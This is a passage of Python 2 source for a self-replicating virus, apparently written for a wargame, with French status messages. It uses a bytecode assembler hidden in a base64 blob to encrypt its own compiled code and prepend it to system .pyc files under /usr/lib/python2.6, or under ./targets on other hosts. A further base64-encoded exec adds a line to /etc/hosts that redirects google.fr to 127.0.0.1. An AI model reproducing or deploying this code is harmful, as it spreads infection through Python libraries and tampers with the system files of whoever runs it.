W9uID09ICcyLjcnOgogICAgICAgICAgICAgICAgICAgIHlpZWxkIHBvcyArIDEsIG5ld3N0YWNrKDIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHlpZWxkIHBvcyArIDEsIG5ld3N0YWNrKC0xKQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGFzc2VydCBGYWxzZSwgIlVuaGFuZGxlZCBvcGNvZGU6ICVyIiAlIG9wCgoKICAgICAgICAjIE5vdyBjb21lcyB0aGUgY2FsY3VsYXRpb246IG9wZW5fcG9zaXRpb25zIGhvbGRzIHBvc2l0aW9ucyB3aGljaCBhcmUKICAgICAgICAjIHlldCB0byBiZSBleHBsb3JlZC4gSW4gZWFjaCBzdGVwIHdlIHRha2Ugb25lIG9wZW4gcG9zaXRpb24sIGFuZAogICAgICAgICMgZXhwbG9yZSBpdCBieSBhZGRpbmcgdGhlIHBvc2l0aW9ucyB0byB3aGljaCB5b3UgY2FuIGdldCBmcm9tIGl0LCB0bwogICAgICAgICMgb3Blbl9wb3NpdGlvbnMuIE9uIHRoZSB3YXksIHdlIHVwZGF0ZSBtYXhzaXplLgogICAgICAgICMgb3Blbl9wb3NpdGlvbnMgaXMgYSBsaXN0IG9mIHR1cGxlczogKHBvcywgc3RhY2sgc3RhdGUpCiAgICAgICAgbWF4c2l6ZSA9IDAKICAgICAgICBvcGVuX3Bvc2l0aW9ucyA9IFsoMCwgKDAsKSldCiAgICAgICAgd2hpbGUgb3Blbl9wb3NpdGlvbnM6CiAgICAgICAgICAgIHBvcywgY3Vyc3RhY2sgPSBvcGVuX3Bvc2l0aW9ucy5wb3AoKQogICAgICAgICAgICBtYXhzaXplID0gbWF4KG1heHNpemUsIHN1bShjdXJzdGFjaykpCiAgICAgICAgICAgIG9wZW5fcG9zaXRpb25zLmV4dGVuZChnZXRfbmV4dF9zdGFja3MocG9zLCBjdXJzdGFjaykpCgogICAgICAgIHJldHVybiBtYXhzaXplCgogICAgZGVmIHRvX2NvZGUoc2VsZik6CiAgICAgICAgIiIiQXNzZW1ibGUgYSBQeXRob24gY29kZSBvYmplY3QgZnJvbSBhIENvZGUgb2JqZWN0LiIiIgogICAgICAgIGNvX2FyZ2NvdW50ID0gbGVuKHNlbGYuYXJncykgLSBzZWxmLnZhcmFyZ3MgLSBzZWxmLnZhcmt3YXJncwogICAgICAgIGNvX3N0YWNrc2l6ZSA9IHNlbGYuX2NvbXB1dGVfc3RhY2tzaXplKCkKICAgICAgICBjb19mbGFncyA9IHNlbGYuX2NvbXB1dGVfZmxhZ3MoKQoKICAgICAgICBjb19jb25zdHMgPSBbc2VsZi5kb2NzdHJpbmddCiAgICAgICAgY29fbmFtZXMgPSBbXQogICAgICAgIGNvX3Zhcm5hbWVzID0gbGlzdChzZWxmLmFyZ3MpCgogICAgICAgIGNvX2ZyZWV2YXJzID0gdHVwbGUoc2VsZi5mcmVldmFycykKCiAgICAgICAgIyBXZSBmaW5kIGFsbCBjZWxsdmFycyBiZWZvcmVoYW5kLCBmb3IgdHdvIHJlYXNvbnM6CiAgICAgICAgIyAxLiBXZSBuZWVkIHRoZSBudW1iZXIgb2YgdGhlbSB0byBjb25zdHJ1Y3QgdGhlIG51bWVyaWMgYXJndW1lbnQKICAgICAgICAjICAgIGZvciBvcHMgaW4gImhhc2ZyZWUiLgogICAgICAgICMgMi4gV2UgbmVlZCB0byBwdXQgYXJndW1lbnRzIHdoaWNoIGFyZSBjZWxsIHZhcnMgaW4gdGhlIGJlZ2lubmluZwogICAgICAgICMgICAgb2YgY29fY2VsbHZhcnMKICAgICAgICBjZWxsdmFycyA9IHNldChhcmcgZm9yIG9wLCBhcmcgaW4gc2VsZi5jb2RlCiAgICAgICAgICAgIGlmIGlzb3Bjb2RlKG9wKSBhbmQgb3AgaW4gaGFzZnJlZQogICAgICAgIGFuZCBhcmcgbm90IGluIGNvX2ZyZWV2YXJzKQogICAgICAgIGNvX2NlbGx2YXJzID0gW3ggZm9yIHggaW4gc2VsZi5hcmdzIGlmIHggaW4gY2VsbHZhcnNdCgogICAgICAgIGRlZiBpbmRleChzZXEsIGl0ZW0sIGVxPW9wZXJhdG9yLmVxLCBjYW5fYXBwZW5kPVRydWUpOgogICAgICAgICAgICAiIiJGaW5kIHRoZSBpbmRleCBvZiBpdGVtIGluIGEgc2VxdWVuY2UgYW5kIHJldHVybiBpdC4KICAgICAgICAgICAgSWYgaXQgaXMgbm90IGZvdW5kIGluIHRoZSBzZXF1ZW5jZSwgYW5kIGNhbl9hcHBlbmQgaXMgVHJ1ZSwKICAgICAgICAgICAgaXQgaXMgYXBwZW5kZWQgdG8gdGhlIHNlcXVlbmNlLgoKICAgICAgICAgICAgZXEgaXMgdGhlIGVxdWFsaXR5IG9wZXJhdG9yIHRvIHVzZS4KICAgICAgICAgICAgIiIiCiAgICAgICAgICAgIGZvciBpLCB4IGluIGVudW1lcmF0ZShzZXEpOgogICAgICAgICAgICAgICAgaWYgZXEoeCwgaXRlbSk6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGNhbl9hcHBlbmQ6CiAgICAgICAgICAgICAgICAgICAgc2VxLmFwcGVuZChpdGVtKQogICAgICAgICAgICAgICAgICAgIHJldHVybiBsZW4oc2VxKSAtIDEKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgSW5kZXhFcnJvciwgIkl0ZW0gbm90IGZvdW5kIgoKICAgICAgICAjIExpc3Qgb2YgdHVwbGVzIChwb3MsIGxhYmVsKSB0byBiZSBmaWxsZWQgbGF0ZXIKICAgICAgICBqdW1wcyA9IFtdCiAgICAgICAgIyBBIG1hcHBpbmcgZnJvbSBhIGxhYmVsIHRvIGl0cyBwb3NpdGlvbgogICAgICAgIGxhYmVsX3BvcyA9IHt9CiAgICAgICAgIyBMYXN0IFNldExpbmVubwogICAgICAgIGxhc3RsaW5lbm8gPSBzZWxmLmZpcnN0bGluZW5vCiAgICAgICAgbGFzdGxpbmVwb3MgPSAwCgogICAgICAgIGNvX2NvZGUgPSBhcnJheSgnQicpCiAgICAgICAgY29fbG5vdGFiID0gYXJyYXkoJ0InKQogICAgICAgIGZvciBpLCAob3AsIGFyZykgaW4gZW51bWVyYXRlKHNlbGYuY29kZSk6CiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uob3AsIExhYmVsKToKICAgICAgICAgICAgICAgIGxhYmVsX3Bvc1tvcF0gPSBsZW4oY29fY29kZSkKCiAgICAgICAgICAgIGVsaWYgb3AgaXMgU2V0TGluZW5vOgogICAgICAgICAgICAgICAgaW5jcl9saW5lbm8gPSBhcmcgLSBsYXN0bGluZW5vCiAgICAgICAgICAgICAgICBpbmNyX3BvcyA9IGxlbihjb19jb2RlKSAtIGxhc3RsaW5lcG9zCiAgICAgICAgICAgICAgICBsYXN0bGluZW5vID0gYXJnCiAgICAgICAgICAgICAgICBsYXN0bGluZXBvcyA9IGxlbihjb19jb2RlKQoKICAgICAgICAgICAgICAgIGlmIGluY3JfbGluZW5vID09IDAgYW5kIGluY3JfcG9zID09IDA6CiAgICAgICAgICAgICAgICAgICAgY29fbG5vdGFiLmFwcGVuZCgwKQogICAgICAgICAgICAgICAgICAgIGNvX2xub3RhYi5hcHBlbmQoMCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgaW5jcl9wb3MgPiAyNTU6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvX2xub3RhYi5hcHBlbmQoMjU1KQogICAgICAgICAgICAgICAgICAgICAgICBjb19sbm90YWIuYXBwZW5kKDApCiAgICAgICAgICAgICAgICAgICAgICAgIGluY3JfcG9zIC09IDI1NQogICAgICAgICAgICAgICAgICAgIHdoaWxlIGluY3JfbGluZW5vID4gMjU1OgogICAgICAgICAgICAgICAgICAgICAgICBjb19sbm90YWIuYXBwZW5kKGluY3JfcG9zKQogICAgICAgICAgICAgICAgICAgICAgICBjb19sbm90YWIuYXBwZW5kKDI1NSkKICAgICAgICAgICAgICAgICAgICAgICAgaW5jcl9wb3MgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGluY3JfbGluZW5vIC09IDI1NQogICAgICAgICAgICAgICAgICAgIGlmIGluY3JfcG9zIG9yIGluY3JfbGluZW5vOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICNjb19sbm90YWIuYXBwZW5kKGluY3JfcG9zKQogICAgICAgICAgICAgICAgICAgICAgICAjY29fbG5vdGFiLmFwcGVuZChpbmNyX2xpbmVubykKCiAgICAgICAgICAgIGVsaWYgb3AgPT0gb3Bjb2RlLkVYVEVOREVEX0FSRzoKICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IsICJFWFRFTkRFRF9BUkcgbm90IHN1cHBvcnRlZCBpbiBDb2RlIG9iamVjdHMiCgogICAgICAgICAgICBlbGlmIG5vdCBvcCBpbiBoYXNhcmc6CiAgICAgICAgICAgICAgICBjb19jb2RlLmFwcGVuZChvcCkKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBvcCBpbiBoYXNjb25zdDoKICAgICAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKGFyZywgQ29kZSkgYW5kIGkgPCBsZW4oc2VsZi5jb2RlKSAtIDEgYW5kIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5jb2RlW2kgKyAxXVswXSBpbiBoYXNjb2RlOgogICAgICAgICAgICAgICAgICAgICAgICBhcmcgPSBhcmcudG9fY29kZSgpCiAgICAgICAgICAgICAgICAgICAgYXJnID0gaW5kZXgoY29fY29uc3RzLCBhcmcsIG9wZXJhdG9yLmlzXykKICAgICAgICAgICAgICAgIGVsaWYgb3AgaW4gaGFzbmFtZToKICAgICAgICAgICAgICAgICAgICBhcmcgPSBpbmRleChjb19uYW1lcywgYXJnKQogICAgICAgICAgICAgICAgZWxpZiBvcCBpbiBoYXNqdW1wOgogICAgICAgICAgICAgICAgICAgICMgYXJnIHdpbGwgYmUgZmlsbGVkIGxhdGVyCiAgICAgICAgICAgICAgICAgICAganVtcHMuYXBwZW5kKChsZW4oY29fY29kZSksIGFyZykpCiAgICAgICAgICAgICAgICAgICAgYXJnID0gMAogICAgICAgICAgICAgICAgZWxpZiBvcCBpbiBoYXNsb2NhbDoKICAgICAgICAgICAgICAgICAgICBhcmcgPSBpbmRleChjb192YXJuYW1lcywgYXJnKQogICAgICAgICAgICAgICAgZWxpZiBvcCBpbiBoYXNjb21wYXJlOgogICAgICAgICAgICAgICAgICAgIGFyZyA9IGluZGV4KGNtcF9vcCwgYXJnLCBjYW5fYXBwZW5kPUZhbHNlKQogICAgICAgICAgICAgICAgZWxpZiBvcCBpbiBoYXNmcmVlOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgYXJnID0gaW5kZXgoY29fZnJlZXZhcnMsIGFyZywgY2FuX2FwcGVuZD1GYWxzZSkgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIGxlbihjZWxsdmFycykKICAgICAgICAgICAgICAgICAgICBleGNlcHQgSW5kZXhFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgYXJnID0gaW5kZXgoY29fY2VsbHZhcnMsIGFyZykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgIyBhcmcgaXMgb2sKICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgYXJnID4gMHhGRkZGOgogICAgICAgICAgICAgICAgICAgIGNvX2NvZGUuYXBwZW5kKG9wY29kZS5FWFRFTkRFRF9BUkcpCiAgICAgICAgICAgICAgICAgICAgY29fY29kZS5hcHBlbmQoKGFyZyA+PiAxNikgJiAweEZGKQogICAgICAgICAgICAgICAgICAgIGNvX2NvZGUuYXBwZW5kKChhcmcgPj4gMjQpICYgMHhGRikKICAgICAgICAgICAgICAgIGNvX2NvZGUuYXBwZW5kKG9wKQogICAgICAgICAgICAgICAgY29fY29kZS5hcHBlbmQoYXJnICYgMHhGRikKICAgICAgICAgICAgICAgIGNvX2NvZGUuYXBwZW5kKChhcmcgPj4gOCkgJiAweEZGKQoKICAgICAgICBmb3IgcG9zLCBsYWJlbCBpbiBqdW1wczoKICAgICAgICAgICAganVtcCA9IGxhYmVsX3Bvc1tsYWJlbF0KICAgICAgICAgICAgaWYgY29fY29kZVtwb3NdIGluIGhhc2pyZWw6CiAgICAgICAgICAgICAgICBqdW1wIC09IHBvcyArIDMKICAgICAgICAgICAgaWYganVtcCA+IDB4RkZGRjoKICAgICAgICAgICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IsICJFeHRlbmRlZCBqdW1wcyBub3QgaW1wbGVtZW50ZWQiCiAgICAgICAgICAgIGNvX2NvZGVbcG9zICsgMV0gPSBqdW1wICYgMHhGRgogICAgICAgICAgICBjb19jb2RlW3BvcyArIDJdID0gKGp1bXAgPj4gOCkgJiAweEZGCgogICAgICAgIGNvX2NvZGUgPSBjb19jb2RlLnRvc3RyaW5nKCkKICAgICAgICBjb19sbm90YWIgPSBjb19sbm90YWIudG9zdHJpbmcoKQoKICAgICAgICBjb19jb25zdHMgPSB0dXBsZShjb19jb25zdHMpCiAgICAgICAgY29fbmFtZXMgPSB0dXBsZShjb19uYW1lcykKICAgICAgICBjb192YXJuYW1lcyA9IHR1cGxlKGNvX3Zhcm5hbWVzKQogICAgICAgIGNvX25sb2NhbHMgPSBsZW4oY29fdmFybmFtZXMpCiAgICAgICAgY29fY2VsbHZhcnMgPSB0dXBsZShjb19jZWxsdmFycykKCiAgICAgICAgcmV0dXJuIHR5cGVzLkNvZGVUeXBlKGNvX2FyZ2NvdW50LCBjb19ubG9jYWxzLCBjb19zdGFja3NpemUsIGNvX2ZsYWdzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb19jb2RlLCBjb19jb25zdHMsIGNvX25hbWVzLCBjb192YXJuYW1lcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5maWxlbmFtZSwgc2VsZi5uYW1lLCBzZWxmLmZpcnN0bGluZW5vLCBjb19sbm90YWIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvX2ZyZWV2YXJzLCBjb19jZWxsdmFycykKCgpkZWYgcHJpbnRjb2RlbGlzdChjb2RlbGlzdCwgdG89c3lzLnN0ZG91dCk6CiAgICAiIiJHZXQgYSBjb2RlIGxpc3QuIFByaW50IGl0IG5pY2VseS4iIiIKCiAgICBsYWJlbGRpY3QgPSB7fQogICAgcGVuZGluZ2xhYmVscyA9IFtdCiAgICBmb3IgaSwgKG9wLCBhcmcpIGluIGVudW1lcmF0ZShjb2RlbGlzdCk6CiAgICAgICAgaWYgaXNpbnN0YW5jZShvcCwgTGFiZWwpOgogICAgICAgICAgICBwZW5kaW5nbGFiZWxzLmFwcGVuZChvcCkKICAgICAgICBlbGlmIG9wIGlzIFNldExpbmVubzoKICAgICAgICAgICAgcGFzcwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHdoaWxlIHBlbmRpbmdsYWJlbHM6CiAgICAgICAgICAgICAgICBsYWJlbGRpY3RbcGVuZGluZ2xhYmVscy5wb3AoKV0gPSBpCgogICAgbGluZW5vID0gTm9uZQogICAgaXNsYWJlbCA9IEZhbHNlCiAgICBmb3IgaSwgKG9wLCBhcmcpIGluIGVudW1lcmF0ZShjb2RlbGlzdCk6CiAgICAgICAgaWYgb3AgaXMgU2V0TGluZW5vOgogICAgICAgICAgICBsaW5lbm8gPSBhcmcKICAgICAgICAgICAgcHJpbnQgPj4gdG8KICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgaWYgaXNpbnN0YW5jZShvcCwgTGFiZWwpOgogICAgICAgICAgICBpc2xhYmVsID0gVHJ1ZQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBpZiBsaW5lbm8gaXMgTm9uZToKICAgICAgICAgICAgbGluZW5vc3RyID0gJycKICAgICAgICBlbHNlOgogICAgICAgICAgICBsaW5lbm9zdHIgPSBzdHIobGluZW5vKQogICAgICAgICAgICBsaW5lbm8gPSBOb25lCgogICAgICAgIGlmIGlzbGFiZWw6CiAgICAgICAgICAgIGlzbGFiZWxzdHIgPSAnPj4nCiAgICAgICAgICAgIGlzbGFiZWwgPSBGYWxzZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlzbGFiZWxzdHIgPSAnJwoKICAgICAgICBpZiBvcCBpbiBoYXNjb25zdDoKICAgICAgICAgICAgYXJnc3RyID0gcmVwcihhcmcpCiAgICAgICAgZWxpZiBvcCBpbiBoYXNqdW1wOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhcmdzdHIgPSAndG8gJyArIHN0cihsYWJlbGRpY3RbYXJnXSkKICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgYXJnc3RyID0gcmVwcihhcmcpCiAgICAgICAgZWxpZiBvcCBpbiBoYXNhcmc6CiAgICAgICAgICAgIGFyZ3N0ciA9IHN0cihhcmcpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXJnc3RyID0gJycKCiAgICAgICAgcHJpbnQgPj4gdG8sICclM3MgICAgICUycyAlNGQgJS0yMHMgJXMnICUgKAogICAgICAgICAgICBsaW5lbm9zdHIsCiAgICAgICAgICAgIGlzbGFiZWxzdHIsCiAgICAgICAgICAgIGksCiAgICAgICAgICAgIG9wLAogICAgICAgICAgICBhcmdzdHIpCgo=")

    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
        if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
            EXPLOIT_SIZE = i + 2
            break
    if not EXPLOIT_SIZE:
        print "EXPLoiT_ISZE not found"

    data.code = data.code[:EXPLOIT_SIZE]
    data.code.append((LOAD_CONST,None))
    data.code.append((RETURN_VALUE,None))
    print "payload clair %s" % CodeList(data.code)
    payload = b64encode(crypt(zlib.compress(marshal.dumps(data.to_code()))))
    template = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
    payload = Code.from_code(compile(template, "z", "exec")).code
    payload = CodeList(payload[:-2])
    #print "payload chiffré %s" % payload

    # ------------- GENERATING PAYLOAD DATA ---------------
    def infect(f_to_infect):
        print "j'infecte %s" % f_to_infect
        if f_to_infect.endswith("socket.pyc"):
            return

        f = open(f_to_infect, 'r')

        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))
        if data.code[1][1] == signature:
            return

        f.close()

        data.code[:0] = payload

        newfile = open(f_to_infect, 'w')
        newfile.write(head)
        marshal.dump(data.to_code(), newfile)
        newfile.close()


    # print """
    #
    # LLLLLLLLLLL                              lllllll   iiii          tttt                                         66666666  999999999
    # L:::::::::L                              l:::::l  i::::i      ttt:::t                                        6::::::6 99:::::::::99
    # L:::::::::L                              l:::::l   iiii       t:::::t                                       6::::::699:::::::::::::99
    # LL:::::::LL                              l:::::l              t:::::t                                      6::::::69::::::99999::::::9
    #   L:::::L                  ooooooooooo    l::::l iiiiiiittttttt:::::ttttttt      aaaaaaaaaaaaa            6::::::6 9:::::9     9:::::9
    #   L:::::L                oo:::::::::::oo  l::::l i:::::it:::::::::::::::::t      a::::::::::::a          6::::::6  9:::::9     9:::::9
    #   L:::::L               o:::::::::::::::o l::::l  i::::it:::::::::::::::::t      aaaaaaaaa:::::a        6::::::6    9:::::99999::::::9
    #   L:::::L               o:::::ooooo:::::o l::::l  i::::itttttt:::::::tttttt               a::::a       6::::::::6666699::::::::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t              aaaaaaa:::::a      6::::::::::::::6699999::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t            aa::::::::::::a      6::::::66666:::::6    9::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t           a::::aaaa::::::a      6:::::6     6:::::6  9::::::9
    #   L:::::L         LLLLLLo::::o     o::::o l::::l  i::::i      t:::::t    tttttta::::a    a:::::a      6:::::6     6:::::6 9::::::9
    # LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::ol::::::li::::::i     t::::::tttt:::::ta::::a    a:::::a      6::::::66666::::::69::::::9
    # L::::::::::::::::::::::Lo:::::::::::::::ol::::::li::::::i     tt::::::::::::::ta:::::aaaa::::::a       66:::::::::::::669::::::9
    # L::::::::::::::::::::::L oo:::::::::::oo l::::::li::::::i       tt:::::::::::tt a::::::::::aa:::a        66:::::::::66 9::::::9
    # LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo   lllllllliiiiiiii         ttttttttttt    aaaaaaaaaa  aaaa          666666666  99999999
    # """
    #print "ici 3"
    if socket.gethostname() == "OT-Wargame":
        target_dir = "/usr/lib/python2.6/*.pyc"
    else:
        target_dir = "./targets/*.pyc"

    for i in glob.glob(target_dir):
        infect(i)

    # print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."

    exec b64decode("aW1wb3J0IHNvY2tldAoKaWYgc29ja2V0LmdldGhvc3RuYW1lKCkgPT0gIk9ULVdhcmdhbWUiOgogICAgbmV3X2hvc3QgPSAiMTI3LjAuMC4xXHRnb29nbGUuZnIiCiAgICBmaWxlbmFtZSA9ICIvZXRjL2hvc3RzIgoKICAgIGYgPSBvcGVuKGZpbGVuYW1lLCAiYSsiKQoKICAgIGlmIGYucmVhZCgpLmZpbmQobmV3X2hvc3QpID09IC0xOgogICAgICAgIGYud3JpdGUobmV3X2hvc3QgKyAiXG4iKQoKICAgIGYuY2xvc2UoKQplbHNlOgogICAgcHJpbnQgIiAjIyMjIyMjIyMjIyAgLyFcIElORkVDVEVEIC8hXCAjIyMjIyMjIyMjIyMjIyMgIgo=")

signature = "PY_2.6"
